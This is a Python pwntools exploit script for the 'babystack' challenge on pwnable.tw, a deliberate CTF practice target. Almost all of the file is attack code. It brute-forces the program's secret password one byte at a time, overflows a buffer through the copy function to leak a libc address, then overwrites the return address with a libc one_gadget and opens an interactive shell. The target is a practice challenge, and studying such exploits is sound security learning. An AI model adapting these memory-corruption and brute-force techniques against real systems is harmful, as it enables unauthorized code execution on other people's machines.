#coding=utf-8
from pwn import *
local = 1
exec_file="./babystack"
context.binary=exec_file
context.terminal=["tmux","splitw","-h"]
elf=ELF(exec_file,checksec = True)
argv=["/home/jlx/glibc-all-in-one/libs/2.23-0ubuntu11.2_amd64/ld-2.23.so",
            "--library-path","/home/jlx/glibc-all-in-one/libs/2.23-0ubuntu11.2_amd64/","./babystack"]
if local :
    a=process(argv = argv)
    if context.arch == "i386" :
        libc=ELF("/home/jlx/glibc-all-in-one/libs/2.23-0ubuntu11.2_amd64/libc-2.23.so",checksec = False)
    elif context.arch == "amd64" :
        libc=ELF("/home/jlx/glibc-all-in-one/libs/2.23-0ubuntu11.2_amd64/libc-2.23.so",checksec = False) 
else:
    a=remote("chall.pwnable.tw",10205)
    libc=ELF("./libc.so.6")
def get_base(a):
    text_base = a.libs()[a._cwd+"/babystack"]
    print hex(text_base)
    for key in a.libs():
        if "libc-2.23.so" in key:
            return text_base,a.libs()[key]
def debug():
    text_base,libc_base=get_base(a)
    script="set $text_base="+str(text_base)+'\n'+"set $libc_base="+str(libc_base)+'\n'
    script+='''
    b * %d
    '''%(text_base + 0x00001052)
    gdb.attach(a,script)
def fuck(address):
    n = globals()
    for key,value in n.items():
        if value == address:
            return success(key+"  ==>  "+hex(address))
def menu(idx):
    a.sendafter(">> ",str(idx))
def login(password):
    menu(1)
    a.sendafter("Your passowrd :",password )
    return 
def logout():
    menu(1)
    return

def copy(content):
    menu(3)
    a.sendafter("Copy :",content)
    return 
    
def edit(idx,content):
    return 
    
def show(idx):
    return 
relloc_offset = [0,2,4,6,0xb,0xc,0x10]
#payload='\x00'*0x33+p64(0x00000000fbad1800)+p64(0)*3+'\x00'    #stdout-0x33 IO_FILE

#debug()

def baopo(init_pwd, length):
    for i in range(length): 
        for j in range(1,256):
            login(init_pwd + chr(j) + '\x00')
            if a.recvline(keepends= False) == "Login Success !":
                init_pwd += chr(j)
                print "the %d character is "%(i) + hex(j)
                logout()
                break
    return init_pwd

password = baopo("",16)

print "password =====>" + hex(u64(password[0:8])) +hex(u64(password[8:16]))

payload = password + '\x00'
payload = payload.ljust(88,'a')
login(payload)
#debug()
payload = 'a' * 63
copy(payload)

#context.log_level = "debug"

logout()
libc_addr = u64(baopo(('a'*16+'1'+'a'*7), 6)[-6:] + 2*'\x00') - libc.sym["setvbuf"] - 324
fuck(libc_addr)


payload = '\x00' + 'a' * 7
payload += 'a' * 56 + password
payload = payload.ljust(0x68,'a')
payload += p64(libc_addr + 0xf1207) + '\x00'

print len(payload)
login(payload)
debug()
payload = 'a' * 63
copy(payload) 

menu(2)

a.interactive()
